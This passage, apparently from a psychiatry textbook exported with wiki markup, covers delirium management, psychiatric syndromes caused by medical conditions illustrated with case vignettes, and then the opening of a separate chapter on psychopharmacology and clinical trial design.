The likelihood of delirium may also be influenced by the kind of care the patient receives. For example, Inouye and coworkers (1999) evaluated 852 hospitalized older patients who were nonrandomly assigned to usual care or management with a multi-pronged intervention designed to minimize risk factors for delirium. These protocols included repeated reorientation of the patient; provision of cognitively stimulating activities; a nonpharmacologic sleep protocol; early mobilization activities and range of motion exercises; timely removal of catheters and physical restraints; use of eyeglasses and hearing aids; and early correction of dehydration. These interventions significantly reduced the incidence of delirium (15.0% in the usual care group versus 9.9% in the intervention group). 
   
=== Treatment and Management of Delirium ===
   
The primary treatment of delirium entails diagnosing and correcting the underlying cause of the brain dysfunction. Thus, if an electrolyte disturbance appears to be the causal factor, one corrects it; if an infection seems to be &quot;driving&quot; the delirium, one treats it with appropriate anti-microbials (which may also provoke confusional states). If the patient’s delirium appears due to a newly-prescribed medication, that agent is held or discontinued immediately, if clinically safe and feasible. (If one must avoid a superimposed withdrawal syndrome, the offending agent is tapered off and discontinued as rapidly as possible). 
      
There are some &quot;cause-specific&quot; agents that treat a few narrowly-defined types of delirium. For example, in cases of known or suspected anticholinergic-induced delirium, the cholinesterase inhibitor, physostigmine, is indicated (and in the U.S., has FDA-approved labeling for this use). However, physostigmine is not without its own side effects, such as bradycardia. In cases of known or suspected alcohol withdrawal-related delirium (delirium tremens, &quot;DTs&quot;), a benzodiazepine is the treatment of choice. For benzodiazepine-induced delirium, limited data suggest that the benzodiazepine antagonist, flumazenil, may be useful (Olshaker &amp; Flanigan, 2003). 
   
In many cases of delirium, a specific cause is not identified, or multiple causes are suspected. If, after a thorough medical evaluation, no specific etiology is found, one is left to &quot;manage&quot; the neurobehavioral complications of delirium as effectively and safely as possible—and without making matters worse. Unfortunately, many psychotropic agents used to manage the behavioral complications of delirium (such as agitation or disinhibted behavior) may themselves cause confusion or exacerbation of the delirium. Thus, treatment should be as conservative as possible, avoiding high doses, or agents whose mechanisms of action overlap with those of drugs implicated in causing the delirium. For example, the hallucinogen, phencyclidine (&quot;PCP&quot;, &quot;Angel Dust&quot;) has complex effects on acetylcholine (Helman &amp; Habal, 2006) that may be exacerbated if one treats PCP-induced psychosis with a highly anticholinergic phenothiazine. 
   
For management of neurobehavioral complications of delirium (marked agitation, aggression, tearing out IV lines, etc.), the agents of choice remain the higher-potency neuroleptics, particularly haloperidol (5-40 mg/day, in divided doses) (Inouye, 2006a). Although larger doses have been used intravenously, particularly in ICU or SICU settings, these agents have risk of producing torsades des pointe arrythmias, which have been associated with lethal ventricular arrythmias, particularly in patients with hypovolemia, hypomagnesemia or other electrolyte abnormalities. (Hassaballa &amp; Balk, 2003).  
   
There is, however, increasing interest in use of newer &quot;atypical&quot; antipsychotics in this setting, and some limited data suggest they may be safe and effective (Han &amp; Kim, 2004). Although benzodiazepines, such as lorazepam, are often administered to delirious patients, this group of agents carries significant risks in this population; e.g., paradoxical &quot;disinhibition,&quot; worsening, or prolongation of the patient’s confusion (Inouye, 2006 a,b). With the exception of delirium tremens, there are few instances of delirium in which benzodiazpines would be indicated. 
   
There is also considerable interest in—but only preliminary evidence for—the use of cholinesterase inhibitors such as donepezil (see above, re: DAT) in delirium. Preliminary evidence has been mixed, and clinical observation suggests that any beneficial effects on confusion and memory impairment are modest and slowly-achieved (Jacobson et al. 2007). One recent controlled study (Liptzin et al. 2005) was &quot;…unable to demonstrate a benefit for donepezil in preventing or treating delirium in a relatively young and cognitively-intact group of elderly patients undergoing elective orthopedic surgery.&quot; 
   
Non-pharmacologic approaches to the delirious patient are an important part of good care, and include provision of &quot;orienting cues,&quot; such as clocks and calendars; continuity of nursing care; placement of familiar objects (such as a family picture) near the patient; and therapeutic use of friends and family to create a familiar and calming environment (Rummans et al. 1995). Finally, primary prevention of delirium involves a comprehensive strategy, including: 1) recognizing and mitigating known risk factors such as dehydration, sleep deprivation, hearing impairment, etc. (Inouye et al. 1999); 2) proactive geriatric consultation, prior to planned surgery; and 3) education of staff charged with the care of high-risk patients (Trzepacz &amp; Meagher, 2008).

== Psychiatric Symptoms Secondary to General Medical Conditions ==

There is a complex and multidimensional relationship between psychiatric and medical illnesses. Psychiatric illness can be exacerbated by the presence of co-morbid medical illness and its management can be made more complex by pharmacologic or other management needs of medical illness. Psychiatric illness can present in general medical settings with medical symptoms secondary to psychiatric illness. Finally psychiatric disorders can be directly caused by the presence of known or occult medical/neurological illness.  In this section, we will focus on this last category. 
      
In the DSM-IV, this heterogeneous group of diagnoses comprises six main categories: psychotic disorders, mood disorders, anxiety disorders, catatonic disorders, personality alterations, and amnestic disorders. In the ICD-10, the term &quot;organic&quot; is applied to the first five categories; e.g., organic hallucinosis and organic delusional disorder; organic mood [affective] disorder; organic anxiety disorder; organic catatonic disorder; and organic personality disorder. We have already alluded to what we view as philosophical problems with the term &quot;organic&quot;. For this reason, we will use the neutral designation, psychiatric symptoms secondary to general medical conditions (Psy-GMCs) as a &quot;bridging&quot; term to encompass both the DSM and ICD categories. 

=== Prevalence in selected settings ===
      
The community prevalence of psychiatric symptoms secondary to general medical conditions (Psy-GMCs) is not well-established, nor is it straightforward to determine. Data from a consultation-liaison service, however, provide some sense of how common Psy-GMCs may be in certain high-risk medical settings.  For example, Rundell and Wise (1989) reviewed  755 cases seen by the psychiatric C-L service in a general hospital.  Fully 38% of depressed patients had some underlying medical or neurological disorder as the likely cause of their depression. The most frequent diagnoses were cerebrovascular accident; Parkinson’s Disease; lupus cerebritis, HIV infection, hypothyroidism, and multiple sclerosis. With respect to manic syndromes on this C-L service, the findings were even more striking: 87% of manic patients had a diagnosis of &quot;organic mood disorder.&quot; The most commonly-implicated causes of this &quot;secondary mania&quot; were corticosteroids, human immunodeficiency virus (HIV) infection, and temporolimbic epilepsy. Psychiatric clinic populations may also show a high prevalence of GMCs associated with psychiatric symptoms. Thus, Koranyi (1979) found that in a psychiatric clinic population, 18% had psychiatric symptoms that could be attributed solely to an underlying—and undetected—medical problem. On the other hand, in routine, non- general hospital, psychiatric inpatient settings, some types of Psy-GMCs may be quite rare. For example, Lo et al. (2007) found that the prevalence of &quot;organic delusional disorder&quot; according to DSM-III-R criteria was only 0.4% of total inpatient psychiatric admissions. 

=== General features and phenomenology of Psy-GMCs ===

There are no pathognomonic signs that reliably distinguish  psychiatric disturbances due to general medical  (&quot;organic&quot;) conditions (Psy-GMCs) from those due to primary psychiatric disorders. For example, with respect to manifestations of the depression itself, there are no singular objective features that would unequivocally distinguish, say, depression due to folic acid deficiency from depression seen in a typical major depressive episode. However, careful attention to (1) the onset, history, and course of the present illness; (2) the patient’s age, prior medical and psychiatric illnesses, and family history; as well as (3) accompanying physical and laboratory findings, may all be of help. 
      
For example, depressive, manic, anxious, or psychotic symptoms that appear to &quot;track with&quot; (correspond closely in time and intensity) the course of an underlying medical disorder may prove to be secondary to that disorder (see Case Vignette). Similarly, the onset of psychiatric symptoms following the introduction, discontinuation, or change in dosage of a particular drug should always raise the prospect of a &quot;secondary&quot; psychiatric syndrome. 
      
The mental status exam may provide clues as to the &quot;secondary&quot; nature of the psychiatric disturbance; e.g., unusual cognitive deficits (such as severe memory impairment) in a patient presenting with anxiety (Goldman, 1992). Abnormal findings on physical examination (such as hypo- or hyperactive reflexes, signs of vitamin deficiency, etc.) and laboratory testing (such as anemia, decreased thyroid function, etc.) may also be helpful in discerning an underlying GMC.  
      
On the other hand, correction of an underlying physical abnormality or drug toxicity does not always translate into an immediate remission of secondary psychiatric symptoms; often, there is a &quot;lag&quot; between correction of the underlying medical or drug-related problem and return to euthymia or baseline mental state. Indeed, as Colon and Popkin observe, sometimes—despite correction of the underlying medical problem—the secondary psychiatric symptoms may develop &quot;a life of their own&quot; and persist for long periods (Colon &amp; Popkin, 2006). Furthermore, as O’Brien et al. (2006) note, 
      
&quot;In some cases (e.g., adrenal insufficiency), appropriate and continued treatment of the underlying condition results in resolution of the psychiatric symptoms. In others (e.g., SLE), treatment of the underlying condition may alleviate but may also exacerbate psychiatric symptoms.&quot;
      
Advanced age, or older age of onset of psychiatric illness  is sometimes a clue to an underlying GMC, though by no means an infallible one. Since the elderly (as well as the very young) are at greater risk for medical illnesses generally, the sudden appearance of apparent psychiatric symptoms in someone over the age of 55 ought to trigger a search for underlying medical factors (though one could say the same for a younger patient with a similarly abrupt onset of psychiatric illness). One’s level of suspicion is generally highest in an older patient whose family history is &quot;negative&quot; for psychiatric disorders, and whose symptoms appear temporally linked to a GMC or drug-related event. In this regard, Lo et al. (2007) reported that compared to patients with (functional) Delusional Disorder, those with &quot;Organic Delusional Disorder&quot; usually had an older age of onset, and less frequently had a relevant family psychiatric history. Similarly, patients diagnosed with &quot;organic mood disorder&quot; were more likely to have a negative family history of depression, compared to medically-ill patients with a diagnosis of major depression (Yates et al. 1991). The patients with organic mood disorder were also less likely than their counterparts to have recovered fully after four years, despite similar treatment as those with major depression. As noted above, patients with older age at onset of affective illness, and without family history of depression, are more likely to have evidence of vascular CNS abnormalities on MRI than those with earlier onset illness.
      
With respect to temporal patterns, an important caveat is in order here: as Colon and Popkin (1996) judiciously observe:
      
&quot;Many clinicians are inclined to rely heavily on a temporal relation to establish an organic etiological relation. Although temporal relation is an instructive parameter, it may be misleading and subject to errors of recall. It is also apparent that psychiatric symptoms may antedate the clinical recognition of the physical illness—that is, anxiety and depression may be the first presenting features of a medical illness.&quot; (p. 413)
	
Sometimes, the &quot;phenomenology&quot; of the syndrome may provide a clue as to its etiology, though this is far from universally the case. For example, when psychotic symptoms develop in the context of a GMC, they tend to present in a characteristic pattern. Thus, many secondary psychotic syndromes are characterized by paranoid delusions, persecutory thoughts, and ideas of reference. Delusions tend to be concrete and changeable, in contrast to the often elaborate, bizarre, and relatively stable delusions seen in, say, schizophrenia or mania. Lishman characterizes &quot;organic delusions&quot; as often persecutory in content, but typically &quot;…poorly elaborated, vague, transient, and inconsistent…&quot; (Lishman, 1998, p. 11). So, for example, the elderly patient in a nursing home who develops an &quot;organic psychosis&quot; may say, on Monday, &quot;The nurses are trying to poison me.&quot; On Tuesday, the same patient may have no particular fears regarding the nurses, but may complain, &quot;My roommate is stealing my jewelry.&quot;  However, in organic delusional syndromes without clouding of consciousness, Lishman notes that &quot;…the delusions may be more coherently organized, with a picture more closely resembling schizophrenia.&quot;
	
With respect to GMCs associated with anxiety, Colon and Popkin (1996) note that, &quot;…there are few current data to indicate whether panic emerging in the medical patient differs from that seen in the primary psychiatric setting. In addition, no data are available about factors such as course and onset in the medical setting.&quot; One exception is the finding by Starkman et al. (1985) showing that in patients (N=17) with pheochromocytoma—a GMC long-associated with anxiety-- none described the severe apprehension or fear characteristic of panic attacks, and none described agoraphobia. 
	
Depression in the medical setting is comprehensively reviewed by Rouchell et al. (1996). Again, there are no pathognomonic signs that clearly point to &quot;secondary&quot; or &quot;organic depressive symptoms.&quot; In addition, the standard diagnostic criteria for major depression in DSM-IV have not been normed for individuals with co-morbid medical illness. However, Goldman (1992) offers the following clues suggesting an underlying medical cause: an atypical clinical picture; resistance to standard treatments; unexplained personality changes; and subtle cognitive findings on mental status exam. 
	
The course of Psy-GMCs depends to a large degree on the nature of the underlying medical condition and how responsive it is to primary treatment. The course is also influenced by the extent and success of symptomatic psychiatric treatment. For example, when there is a progressive or intermittently active degenerative CNS process at work, such as multiple sclerosis, course and outcome are likely to be less favorable. On the other hand, psychiatric symptoms due to acute anticholinergic toxicity may be resolved within a matter of hours, if diagnosis and treatment proceed expeditiously. 

Psychotic Disorder Due to GMC

Psychotic symptoms may result from a multitude of medical and neurological disorders, as well as from numerous drug-related side effects. Some of the more common organic etiologies are shown in Table 2.

In the DSM-IV, Psychotic Disorder Due to GMC is sub-typed based on the predominant symptom; i.e., &quot;with delusions&quot; or &quot;with hallucinations.&quot; Of course, the two often occur together. The DSM-IV also specifies that the symptoms must not occur exclusively while the patient is delirious, or be better explained by another mental disorder. 
   
Although a plethora of medical and neurological conditions may produce psychotic symptoms, particular attention should be focused on disorders affecting the occipital and temporal regions. For example, cerebral tumors in these regions may produce hallucinations in various modalities, as well as delusions (Sadock &amp; Sadock, 2007). The differential diagnosis of &quot;psychosis&quot; is therefore extremely important. In one study (Malmud, 1967) 6 of 11 patients with temporal lobe tumors initially presented with a diagnosis of schizophrenia, though other studies of patients with temporal lobe tumors have shown much lower rates of psychotic symptoms . Complex partial seizures originating in the temporal or frontal regions may also  produce psychotic-like symptoms, as well as olfactory or gustatory hallucinations. 
   
Case vignette: Ms. A, a 38-year-old white female with long history of vague medical problems, was brought to emergency room by her family because she had boarded up all the windows at her house and refused to come outside. The patient claimed her neighbors were &quot;spying&quot; on her and &quot;want to do me in.&quot; She was fully oriented, and both recent and remote memory intact. There was no fluctuation in her level of consciousness. The patient denied any unusual perceptual changes, auditory, visual, or tactile hallucinations. Physical examination was essentially normal. However, laboratory studies revealed normocytic anemia, leukopenia, and red cell casts in urine. Subsequent testing for antinuclear antibody (ANA) was strongly positive; a provisional diagnosis of systemic lupus erythematosus (SLE) with cerebral involvement (&quot;lupus cerebritis&quot;) was made. 
   
Mood disorder due to general medical condition	

The DSM-IV recognizes four main subtypes of mood disorder due to a GMC: with depressive features; with major-depressive like episode; with manic features; and with mixed features. The ICD-10 uses a slightly different scheme, differentiating organic manic disorder; organic bipolar disorder; organic depressive disorder; and organic mixed affective disorder. 
   
As with the psychoses due to GMCs, secondary mood disorders may stem from a multitude of underlying medical and neurological conditions. In consultation-liason settings, as noted earlier, the most frequent underlying GMCs were cerebrovascular accident (including stroke); Parkinson’s Disease; lupus cerebritis, HIV infection, hypothyroidism, and multiple sclerosis (Rundell &amp; Wise, 1989). Post-stroke depression merits special attention, in that as many as 50% of all post-stroke patients experience depressive illness. A similar percentage applies to patients with pancreatic cancer, and to about 40% of patients with Parkinson’s Disease (Sadock &amp; Sadock, 2007). However, the diagnosis of depression in the medical setting is complicated by the substantial overlap between somatic symptoms related to the underlying GMC, and neurovegetative symptoms of depression (for review, see Harnett, 2001). For example, some data (Musselman et al. 1998) indicate that major depression is seen in approximately 15-20% of patients with coronary (ischemic) heart disease (IHD). However, depression may sometimes be over-diagnosed in this population if &quot;lethargy&quot; or &quot;apathy&quot; secondary to congestive heart failure is inappropriately counted as signifying major depression. There may also be over-diagnosis of depression in IHD patients who have become &quot;demoralized&quot;—but not clinically depressed—about their medical setbacks (Harnett, 2001). 
   
Indeed, the pathophysiological relationship between underlying medical illness and mood disorder is quite complex. For example, it is not always clear to what degree a depressed medical patient may be &quot;reacting psychologically&quot; to the incapacity stemming from a GMC; or experiencing subtle but direct biochemical and immunological effects on the brain, stemming from the GMC (Harnett &amp; Pies, in press). One illustration of this is in the area of IHD. Depression-related immune dysfunction may worsen IHD via inflammatory cytokines (e.g., interleukin-6, tumor necrosis factor alpha). But IHD-related immune abnormalities may also contribute to depression (Kop et al. 2005). Moreover, social isolation, psychosocial stress, and low levels of perceived support are related to both depression and IHD, and could mediate bidirectional effects on these conditions (Barth et al. 2004; Lett et al. 2004). However depression is a well-established risk factor for increased mortality in post-myocardial infarction patients. In short, there are very complex relationships between underlying medical illness and the appearance of depressive symptoms. 
   
This is also true, to some degree, with medication-related mood alterations. Establishing a causal connection between ingestion of a particular drug and the development of clinical depression is far from straightforward, notwithstanding epidemiological evidence linking some drugs with depression (Rogers and Pies, 2008). Although often mentioned as causes of drug-induced depression, beta blockers and calcium channel blockers are only weakly-linked with this side effect. In contrast, some medications—such as alpha-interferon and isotretinoin—do appear strongly, if not causally, linked with new- onset depression (Bonaccorso et al. 2002; Wysowski et al. 2001) 

Case vignette: Mr. A., a 65-year-old married male without prior psychiatric history presented with a one month history of &quot;feeling really down.&quot; He also related that, for the past three weeks or so, he had experienced vague gastrointestinal distress; decreased appetite; and a 15-lb weight loss. One month earlier, a close friend had died after a long illness, and Mr. A. attributed his sadness to this recent loss. Mental status exam was notable for a pale, cachectic individual whose affect appeared somewhat blunted, with occasional tearfulness. Cognitive examination was essentially within normal limits. Physical examination revealed an enlarged, non-tender gallbladder, and slight jaundice. Urinary amylase levels were elevated. A CT scan of the abdomen revealed cancer of the head of the pancreas with obstruction of the gallbladder. 

Anxiety disorder due to general medical condition           

The DSM-IV defines three main subtypes of anxiety disorder due to GMC: with generalized anxiety, with panic attacks, and with obsessive-compulsive symptoms. Although the overall prevalence of anxiety due to GMCs is not known, there is substantial evidence that medically-ill individuals have higher rates of anxiety than does the general public (Sadock &amp; Sadock, 2007). For example, one study of patients with Parkinson’s disease found that 38% of patients received a current DSM-III-R anxiety disorder diagnosis, including panic disorder, generalized anxiety disorder, and social phobia (Stein et al. 1990). Importantly, severity of anxiety was not correlated with severity of parkinsonian symptoms, cumulative duration of L-dopa exposure, or current dose of L-dopa. Similarly, among diabetic patients, the lifetime prevalence rates for phobic disorders and generalized anxiety disorders were 26.5% and 41%, respectively (Lustman et al. 1986). 

As with other categories of secondary psychiatric symptoms, anxiety due to GMCs may stem from many underlying causes, as shown in Table 3.  Endocrinopathies—notably, hyperthyroidism, hypo- and hyperparathyroidism, and pheochromocytoma—are commonly associated with anxiety (as well as with depression). Cardiac arrythmias may be both the cause, and the result, of anxiety, sometimes leading to a &quot;vicious cycle.&quot; For example, an individual with underlying heart disease who develops a &quot;run&quot; of supraventricular tachycardia may become very anxious upon experiencing the sensation of &quot;palpitations&quot;, and thereby exacerbate or prolong the tachycardia. Although mitral valve prolapse is mentioned in older textbooks as a cause of anxiety (especially panic attacks), the evidence for this link is actually tenuous. One recent review (Filho et al. 2008) concluded that, &quot;the more elaborate the study methodology, the lower the chance to observe a significant relationship between these (two) conditions.&quot;  

A number of degenerative brain diseases may be associated with marked anxiety, including Alzheimer’s Disease (DAT), Wilson’s Disease, and Huntington’s Disease. The frequency of anxiety in patients with DAT averages 48%, versus about 6% in elderly patients without DAT (Mega et al. 1996; Apostolova &amp; Cummings, 2008). 

The list of medications causing anxiety is very extensive, and includes bronchodilators, thyroid preparations, theophylline, psychostimulants (such as methylphenidate), antipsychotics, and antidepressants. A variety of over-the-counter remedies, such as antihistamines and herbal preparations, may also trigger or exacerbate anxiety. Recently, anxiety, tachycardia, and even seizures have been linked with various &quot;energy drinks&quot; containing high concentrations of caffeine (Clauson et al. 2008).

'''Modified and condensed from Colon &amp; Popkin, 1996; and Soreff  &amp; McNeil, 1987'''

Case vignette:  A 67 year-old. bedridden female was brought to the emergency room by her son. The patient had been experiencing severe anxiety for the past two hours. She was alert and oriented, but appeared extremely anxious and tremulous.  Her breathing was rapid and patient complained of palpitations and lightheadedness.  She had learned the day before that she was facing eviction from her apartment. The provisional diagnosis was &quot;Panic attack with hyperventilation, precipitated by threat of eviction.&quot;  Physical exam was notable for a pulse of 120; diaphoresis; and localized wheezes upon auscultation of the chest. A chest radiograph was within normal limits. However, a perfusion scintiscan of the lung revealed acute pulmonary embolus, and the patient was immediately hospitalized.  

Personality change due to general medical condition 

DSM-IV recognizes five main subtypes of personality change due to general medical condition (PC-GMC); i.e., labile, disinhibited, aggressive, apathetic, and paranoid. However, &quot;other&quot; &quot;combined&quot; and &quot;unspecified&quot; subtypes allow for the almost infinite variations and combinations of personality alterations that may be observed clinically. The older term &quot;organic personality syndrome&quot; also subsumes these categories. 
   
A variety of medical and neurological conditions may lead to alterations in the individual’s usual personality, temperament, or life-long character traits. According to Reid (1989), the most common causes of PC-GMC (&quot;organic personality syndrome&quot;) are head trauma, cerebrovascular accident, and space-occupying intracranial lesions. Other common causes include temporal lobe epilepsy, multiple sclerosis, chronic intoxications, endocrine disorders, and CNS infections such as neurosyphilis. 
   
It is useful to focus on personality alterations due to lesions or dysfunction in frontal-subcortical circuits and within the temporal lobes.  Tekin &amp; Cummings (2002) have identified five parallel frontal-subcortical circuits that link specific areas of the frontal cortex to the striatum, basal ganglia and thalamus. Lesions originating in the orbitofrontal region lead to personality changes characterized by disinhibition; e.g., the patient begins to use profanity or exhibit sexually provocative behaviors. Lesions originating in the anterior cingulate portion of the frontal cortex produce an apathetic picture; e.g., a once outgoing and vociferous individual becomes withdrawn, indifferent, and uninterested in his usual activities. 
   
Lesions or abnormal electrical activity in the temporal lobes also produce alterations in personality. For example, in temporal lobe epilepsy, the most common psychiatric abnormality is personality change (Chuang, 2006). Hyperreligiosity, hypergraphia, and hyposexuality are reportedly more common in patients with temporal lobe epilepsy than with other forms of epilepsy (Chuang, 2006), though not all neurologists accept this view. Tumors within or impinging upon the temporal lobes may also produce alterations in personality, including irritability, hypochondriasis, or an accentuation of neurotic traits. Some of these alterations may actually reflect temporal lobe epilepsy secondary to the tumor (Lishman, 1998).
   
Case vignette: A 63 year-old banker was fired for inappropriate sexual advances toward employee. He was subsequently picked up by the police for urinating in parking lot of exclusive restaurant and shouting obscenities. His wife described him as &quot;just not himself over the past couple of months—it’s like he has no self-control and no conscience.&quot; Neurological exam in the psychiatrist’s office was essentially within normal limits, with no &quot;focal&quot; findings, except for abnormal grasp reflex (a tongue depressor repeatedly placed in the patient’s hand led to his repeatedly grasping it). Magnetic resonance imagery (MRI) showed a large meningioma of the orbitofrontal cortex.  

Catatonic Disorder Due to General Medical Condition

&quot;Catatonia&quot; is probably best conceptualized as a syndrome with markedly diverse etiologies. Fink and Taylor (2006) have proposed three catatonia subtypes (nonmalignant, delirious, and malignant) and four specifiers (secondary to: mood disorders, general medical conditions or toxic states, neurological disorders, or psychotic disorders). 
   
When no identifiable medical or neurological cause is present, about 40% of cases prove secondary to mood disorders, whereas only about 10% are associated with schizophrenia (Sadock &amp; Sadock, 2007). Catatonic disorder due to GMC is not a well-studied phenomenon, and its prevalence has not been clearly established. Features include immobility, psychomotor agitation, mutism, negativism, grimacing, peculiar motor behaviors (such as assuming and maintaining unusual postures, sometimes characterized by &quot;waxy flexibility&quot;), echolalia, and echopraxia. Medical and neurological causes of catatonia include drug toxicity, including neuroleptic malignant syndrome (NMS), CNS neoplasms, encephalitis, head trauma, lesions of the fronto-subcortical circuit, and contralateral parietal lobe lesions (Ovsiew, 2008). When catatonia is accompanied by fever and autonomic instability, it may represent malignant catatonia, a potentially lethal form of catatonia which needs emergent treatment with electroconvulsive therapy (ECT) (Fink &amp; Taylor, 2006). 

Case vignette: A 53-year old male presented to a psychiatrist with a provisional diagnosis of &quot;late onset schizophrenia.&quot; The man had in fact been functioning quite well until about a year ago, when he developed insidious signs of forgetfulness, apathy, and abulia (loss of spontaneity and effort). Recently, he had also developed leg weakness and &quot;fainting spells.&quot; However, his presentation to the psychiatrist was one of mutism and marked decrease in voluntary movements of any kind; indeed, the psychiatrist described the patient as &quot;grossly catatonic.&quot; Given the atypical age of onset for schizophrenia, and history of leg weakness, an MRI was ordered. It revealed &quot;ventriculomegaly; hydrocephalus secondary to subthalamic mesencephalic tumor involving the third and the lateral ventricles.&quot; Surgical placement of a ventriculoperitoneal shunt led to resolution of the catatonia over a period of several days (Neuman et al. 1996). 

Amnestic Disorder due to GMC

Amnestic disorders entail impairment in the ability to learn new information, or to recall previously learned information. Amnesia is most commonly found in patients with a history of alcohol abuse or head injury, in which bilateral damage to mid-temporal lobe structures (such as the hippocampus, mamillary bodies or amgydala) has occurred. In the DSM-IV, the two primary categories are amnestic disorder due to GMC, and substance-induced persisting amnestic disorder. 
	
Numerous GMCs may produce amnestic disorder, including thiamine deficiency, hypoglycemia, carbon monoxide poisoning, hypoxia, and herpes simplex encephalitis, all of which tend to produce bilateral hippocampal damage (Sadock &amp; Sadock, 2007). 	Korsakoff’s Syndrome (KS) is characterized by marked amnestic symptoms in the presence of generally preserved cognitive function in other spheres. Essentially, KS is the chronic amnestic phase of Wernicke-Korsakoff Syndrome. Though the predominant defect in KS is usually anterograde amnesia—i.e., impaired ability to retain new memories--there is often a retrograde amnestic component as well. Usually, there is relative sparing of remote memory. Lishman (1998) has noted that the line between Korsakoff’s Syndrome and so-called alcoholic dementia is not always sharp, and there are most likely gradations or intermediate states between these two conditions.  KS–though conventionally attributed to thiamine deficiency—is closely associated with alcohol abuse and dependence. Indeed, Lishman (1998) goes so far as to opine that, &quot;…the rarity of a fully fledged Korsakoff syndrome as a residue of thiamine deficiency in non-alcoholics raises the possibility that a direct neurotoxic action of alcohol may play some part in the evolution of the condition (p. 582).&quot;

=== Medical and Laboratory Evaluation for Psy-GMC ===

Given the prevalence of undetected medical illness in psychiatric populations, it is incumbent upon the physician to treat all putative &quot;psychiatric&quot; symptoms with a certain degree of skepticism. As noted earlier in this chapter, one’s degree of suspicion is raised when the patient presents with a recent change in mental status, particularly when this occurs in temporal proximity to a known medical illness or drug-related event. Atypical presentations; late-life onset; and illness that fail to respond to standard therapies should all raise ones suspicion of a medical cause. The basic &quot;work up&quot; of suspected psychiatric symptoms due to GMC is outlined in Table 4. 

'''Table 4: Physical Evaluation, Laboratory and Other Investigations for Psy-GMC'''

=== Treatment of Psy-GMCs ===

Treatment of individual Psy-GMCs is beyond the scope of this chapter, since it necessarily focuses on primary treatment of the numerous underlying medical conditions. Symptomatic treatment with psychotropic agents may be conservative for Psy-GMCs, and depends on whether the predominant disturbance is in the realm of mood, reality testing (psychosis), anxiety, personality, etc. Though psychotropics aimed at a particular GMC-related symptom may sometimes be useful—e.g., antipsychotics for &quot;organic&quot; psychosis, or antidepressants for depression due to a GMC—most psychotropics run the risk of further clouding the patient’s mental state, or introducing side effects and drug-drug interactions. Nevertheless, there is a role for judicious use of psychotropics in certain instances; e.g., antidepressants in post-stroke depression, or depression related to Parkinson’s disease.

      <text xml:space="preserve">The use of psychotropic medicines to treat psychiatric illness has increased dramatically in recent times.  Although the biological etiologies of most psychiatric disorders are still unclear, effective pharmacological treatments have been developed over the past 50 years that have become part of the standard of care in the treatment of most major psychiatric disorders. 
	
Psychiatric medications are part of the armamentarium of most practicing physicians, regardless of medical specialty.  In the United States, although most severe types of mental illness are likely to be treated by psychiatrists, most prescriptions for psychotropics (e.g., anxiolytics and newer antidepressants) are written by non-psychiatrists.(Stagnitti, 2008)  Psychiatric medications are consistently prominent in the list of the top 200 most commonly prescribed medications, and in the top 20 pharmaceuticals in terms of sales in the United States.  From 2003-2007 antidepressants, as a class, topped all other therapeutic classes for the overall number of dispensed prescriptions in the U.S.(IMS Health, 2007) 
	
As in the treatment of all medical disorders, a thorough evaluation must precede psychiatric diagnosis and subsequent psychopharmacological treatment.  A complete history should be obtained and the patient should be examined.  Medical or neurological etiologies that may contribute to the presentation of psychiatric illness should be identified and addressed.  Nearly 10% of patients presenting with a psychiatric complaint will turn out to have a medical problem as the primary cause.(Hall, Popkin et al. 1978)  Active substance abuse, if present, should be treated before or at the same time that pharmacological therapies are initiated.
	
The clinician should then decide if the condition requires medication treatment.  Mild to moderate anxiety and depression generally respond equally well to supportive interventions or psychotherapy.(APA, 2004; Barkham and Hardy, 2001; Cuijpers, van Straten et al. 2009; King, Sibbald et al. 2000)  On the other hand, if the psychiatric disorder or symptoms are severe, or if psychosis, mania, or dangerousness are present, then psychopharmacological treatments (and referral to a psychiatrist) are indicated.  Although many primary care physicians may be quite comfortable with their ability to manage psychiatric illness, the amount of monitoring that is required to provide adequate follow-up should be taken into account before initiating treatment.  When treating moderate to severe psychiatric illness, optimum therapy includes the use of concomitant psychotherapy in addition to pharmacotherapeutic measures.(APA, 2004; APA, 1998; APA, 2000; Keller, McCullough et al. 2000; Banerjee, Shamash et al. 1996; Reynolds, Frank et al. 1999; Katon, Von Korff et al. 1999; Miklowitz, 2008)
	
Placebo-controlled randomized clinical trials, using strict exclusionary criteria when selecting subjects, have traditionally been used to study a psychiatric medication’s efficacy (i.e., the ability of the medication to treat the condition better than placebo under controlled conditions).  For example, studies comparing an antidepressant to placebo may use an 8 week double-blind parallel design and include subjects with major depression but without any other medical or psychiatric co-morbidities.  Response may be defined as a 50% improvement in a chosen outcome rating scale.  These efficacy studies also provide the response data that pharmaceutical companies must submit to the Food and Drug Administration (FDA) to obtain indications for developed drugs. 
	
Effectiveness studies, on the other hand, are often larger, naturalistic studies that attempt to approximate &quot;real world&quot; conditions by studying patients who may have psychiatric and medical co-morbidities, and by relying on broader outcome measures for assessing response.  These studies may compare outcomes of treatment with multiple medications.  As such, effectiveness studies complement our understanding of drug efficacy.(Summerfelt and Meltzer, 1998)  Recent National Institute of Mental Health (NIMH) sponsored effectiveness studies have the added benefit of funding from a neutral (non-pharmaceutical industry) source, thereby avoiding possible study design shortcomings or evaluator biases that may influence study results.(Heres, Davis et al. 2006; Osser, 2008)  These studies include (1) the Clinical Antipsychotic Trials of Intervention Effectiveness (CATIE),(Keefe, Bilder et al. 2007; Lieberman, Stroup et al. 2005) (2) the Sequenced Treatment Alternatives to Relieve Depression Study (STAR*D),(Rush, Trivedi et al. 2006; McGrath, Stewart et al. 2006; Nierenberg, Fava et al. 2006; Trivedi, Fava et al. 2006; Fava, Rush et al. 2006) (3) the Systematic Treatment Enhancement Program for Bipolar Disorder (STEP-BD),(Sachs, Nierenberg et al. 2007; Goldberg, Perlis et al. 2007; Miklowitz, Otto et al. 2007) (4) the Clinical Antipsychotic Trials of Intervention Effectiveness—Alzheimer’s Disease (CATIE-AD),(Schneider, Tariot et al. 2006; Sultzer, Davis et al. 2008) and (5) the National Institute of Alcohol Abuse and Alcoholism (NIAAA) sponsored Combined Pharmacotherapies and Behavioral Interventions Study (COMBINE).(Anton, O'Malley et al. 2006; Anton, Oroszi et al. 2008)  Findings from these studies are now influencing clinical psychiatric practice.
	
